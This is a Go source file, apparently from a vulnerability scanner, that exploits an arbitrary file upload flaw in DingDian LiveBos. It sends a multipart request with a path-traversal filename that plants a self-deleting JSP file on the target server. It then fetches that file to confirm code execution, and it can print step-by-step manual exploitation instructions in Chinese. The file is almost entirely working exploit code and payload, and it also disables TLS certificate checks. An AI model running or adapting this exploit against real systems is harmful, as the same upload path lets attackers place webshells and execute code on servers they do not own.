package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func DingDianRuanJianLiveBos_AnyFileUpload(url string, Attack bool) error {
	payload := `------WebKitFormBoundaryrCXQPqpxLn9uEhAk
Content-Disposition: form-data; name="filename";filename="//../../../../test2.jsp"

<%@ page import="java.io.File" %>
<%
 out.println("ycxhhh");
 String filePath = application.getRealPath(request.getServletPath());
 new File(filePath).delete();
%>
------WebKitFormBoundaryrCXQPqpxLn9uEhAk--`

	payload = strings.ReplaceAll(payload, "\n", "\r\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/feed/UploadFile.do;.js.jsp", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryrCXQPqpxLn9uEhAk")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	url2 := fmt.Sprintf("%s/test2.jsp;.js.jsp", url)
	request2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
	}

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body2), "ycxhhh") {
		fmt.Println("[*]DingDianRuanJianLiveBos_AnyFileUpload : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/feed/UploadFile.do;.js.jsp，并传入请求体`------WebKitFormBoundaryrCXQPqpxLn9uEhAk\nContent-Disposition: form-data; name=\"filename\";filename=\"//../../../../test2.jsp\"\n\n<%@ page import=\"java.io.File\" %>\n<%\n out.println(\"ycxhhh\");\n String filePath = application.getRealPath(request.getServletPath());\n new File(filePath).delete();\n%>\n------WebKitFormBoundaryrCXQPqpxLn9uEhAk--\n再访问ip/test2.jsp;.js.jsp`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
